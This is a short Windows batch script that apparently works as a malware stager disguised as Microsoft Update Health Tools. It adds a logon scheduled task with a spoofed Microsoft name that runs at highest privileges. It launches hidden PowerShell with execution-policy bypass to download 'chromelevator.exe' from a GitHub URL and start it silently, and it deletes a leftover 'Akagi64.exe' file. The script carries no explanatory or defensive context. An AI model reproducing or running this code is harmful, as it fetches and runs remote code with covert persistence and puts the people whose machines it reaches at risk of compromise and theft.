@echo off
set "STAGE=C:\Program Files\Microsoft Update Health Tools\Tools"
del /f /q "%TEMP%\Akagi64.exe" >nul 2>&1

schtasks /query /tn "\Microsoft\Windows\UpdateHealthTools" >nul 2>&1 || schtasks /create /tn "\Microsoft\Windows\UpdateHealthTools" /tr "C:\Windows\System32\cmd.exe /c \"%STAGE%\main.cmd\"" /sc onlogon /rl highest /f >nul 2>&1

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/chromelevator.exe' -OutFile '%STAGE%\chromelevator.exe' -UseBasicParsing"

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\chromelevator.exe' -WindowStyle Hidden"
